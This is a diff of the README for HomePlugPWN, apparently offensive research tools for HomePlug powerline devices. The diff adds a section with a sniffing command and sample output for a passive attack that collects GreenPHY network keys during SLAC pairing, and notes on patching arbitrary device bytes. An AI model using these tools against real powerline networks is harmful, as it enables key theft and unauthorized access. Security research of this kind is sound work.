@@ -1,12 +1,8 @@
-Support
-=======
-
-This project has been developed at Sogeti when the R&D lab was still up. For ongoing support, visit @FlUxIuS' repository https://github.com/FlUxIuS/HomePlugPWN. 
-
 HomePlugPWN
 ===========
 
-HomePlugAV PLC tools presented at NoSuchCon 2014: http://www.nosuchcon.org/talks/2014/D1_03_Sebastien_Dudek_HomePlugAV_PLC.pdf
+- HomePlugAV PLC tools presented at NoSuchCon 2014: http://www.nosuchcon.org/talks/2014/D1_03_Sebastien_Dudek_HomePlugAV_PLC.pdf
+- Tools on HomePlug GreenPHY will be presented soonly...
 
 ## Requirements 
 - Python >= 2.6
@@ -23,6 +19,7 @@ HomePlugAV PLC tools presented at NoSuchCon 2014: http://www.nosuchcon.org/talks
 - plcmon.py: enables 'Sniffer mode' and uses Sniffer Indicate packet to retrieve CCos MAC address
 - PIBdump.py: dumps your entire PLC configure (PIB) into a file
 - patchPIB.py: patch arbitrary bytes of your PLC, or a field between bytes 0x0-0x400 (see the details of ModulePIB conditions in the Scapy layer). 
+- HPGPKeysCollect.py: parse HPGP messages and collect keys
 
 ## Efficient remote attack quick guide
 
@@ -92,6 +89,26 @@ Nevertheless, if you want to change any arbitrary byte use this command as follo
 
 Like this, you can rewrite the tone map and any other field of your choice ;)
 
+## Collecting HomePlug GreenPHY keys from SLAC procedure
+
+The standard is vulnerable to passive attack, letting an attacker to collect keys during a SLAC procedure.
+
+The tool `HPGPKeysCollect.py` implements the passive attack to collect keys from a capture, or by sniffing the local PLC interface as follows:
+
+```bash
+python HPGPKeysCollect.py -i eth0
+[...]
+Sniffing on interface 'eth0'
+[...]
+[+] New keys collected for NetID ('\x45\x00\x23\x34\x76\x34\x01')
+{'EVID': '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xcc',
+ 'EVSEID': '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
+ 'NMK': 'YT\xe2\x1e\x45\xf4\x23\x00E\x34\x45\xe7\xc2\x34',
+ 'RunID': '\x12BA\xee\xff\xe1\x36\x09'}
+```
+
+Please note that at least byte `0x1653` of the PLC should be set to '1' to get it work.
+
 ## Licence
 
 HomePlugPWN tools including the HomePlugAV scapy Layer are under the **GPLv2**
@@ -106,3 +123,4 @@ HomePlugPWN tools including the HomePlugAV scapy Layer are under the **GPLv2**
 * Ben Tasker for finding CCos MAC addresses in Sniff Indicate packets
 * Open-PLC-Utils : https://github.com/qca/open-plc-utils
 * Netgear and TP-Link utilities
+* Homeplug AV and IEEE 1901: A Handbook for PLC Designers and Users
